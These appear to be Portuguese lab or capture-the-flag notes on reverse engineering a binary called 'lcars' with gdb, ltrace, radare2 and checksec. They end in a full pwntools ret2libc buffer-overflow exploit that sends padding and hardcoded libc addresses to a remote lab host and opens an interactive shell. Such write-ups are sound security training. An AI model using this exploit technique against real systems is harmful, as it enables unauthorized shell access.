# Reverse Engineering

`ltrace ./lcars`

Install

```
curl -Ls https://github.com/radareorg/radare2/releases/download/5.8.8/radare2-5.8.8.tar.xz | tar xJv
radare2-5.8.8/sys/install.sh

sudo apt install ltrace
```

Processo

```
gdb **binario
(gdb)r**
```

![Untitled](Reverse%20Engineering%20d0ea6212a7fd475fb16dbeaa86e76767/Untitled.png)

`gdb .lcars`

`checksec` 

Isto serve para verificar as `compile time options`

![Untitled](Reverse%20Engineering%20d0ea6212a7fd475fb16dbeaa86e76767/Untitled%201.png)

Na maquina comprometida encontramos o a arquitetura i386

`ldd /bin/lcars | grep libc`

Como ele dá o resultados sempre igual vulnerável a este tipo de ataque

![Untitled](Reverse%20Engineering%20d0ea6212a7fd475fb16dbeaa86e76767/Untitled%202.png)

Para obter os valores de memoria corretos ret2libc 

![Untitled](Reverse%20Engineering%20d0ea6212a7fd475fb16dbeaa86e76767/Untitled%203.png)

Exploit

```
from pwn import *

context(os="linux", arch="i386")
HOST, PORT = "10.129.50.218", 32812

# Crie uma sequência de bytes de 212 instruções NOP
junk = b"\x90" * 212

# Construa a carga útil ret2libc com endereços de system(), exit() e o endereço de "/bin/sh"
ret2libc = p32(0xf7e4c060)  # endereço de system()
ret2libc += p32(0xf7e3faf0)  # endereço de exit()
ret2libc += p32(0xf7f6ddd5)  # endereço de "/bin/sh"

# Combine junk e a carga útil ret2libc
payload = junk + ret2libc

# Conecte-se ao servidor remoto
r = remote(HOST, PORT)
r.recvuntil("Enter Bridge Access Code:")
r.sendline("picarda1")
r.recvuntil("Waiting for input:")
r.sendline("4")
r.recvuntil("Enter Security Override:")
r.sendline(payload)

# Inicie um shell interativo para interagir com o servidor conectado
r.interactive()
```